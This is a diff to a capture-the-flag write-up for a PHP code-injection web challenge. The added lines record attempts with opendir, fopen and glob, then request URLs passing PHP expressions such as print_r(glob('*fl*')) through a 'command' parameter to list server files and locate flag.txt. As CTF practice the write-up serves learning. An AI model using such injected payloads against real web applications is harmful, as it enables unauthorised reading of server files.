@@ -78,5 +78,29 @@ but that is not working having %0A
 - https://ctf-wiki.mahaloz.re/web/php/php/
 ### try exploit
 - use fopen and _()
+### try opendir()
+![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/409f80a0-b829-4f48-a06b-7736375c868e)
+### try readtext(listdir)
+fopen(listdir())
+- so we did executied glob('fl')
+- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/2a4d7d89-9430-48e4-9025-c95602a47e01)
+- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ff996fb4-ed4a-4f1f-adf6-c7030297da19)
+- it returns list of files
+```
+https://ch2474161007.ch.eng.run/?command=fopen(glob(%27fl%27)[0],%27r%27);
+```
+# print_r to get the output on the screne
+![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/a2b5d6c7-24bc-4af8-a731-96f944d9a703)
+```
+https://ch2474161007.ch.eng.run/?command=print_r(glob(%27*fl*%27));
+```
+![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/b52145e5-c403-4b00-89b1-b3896976fc92)
+```
+https://ch2474161007.ch.eng.run/?command=print_r(glob(%27*fl*%27)[0]);
+```
+with this we do get the file name flag.txt
+![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/5371dd6d-b892-4b70-aa48-459a310a2eaa)
+
+
 
 
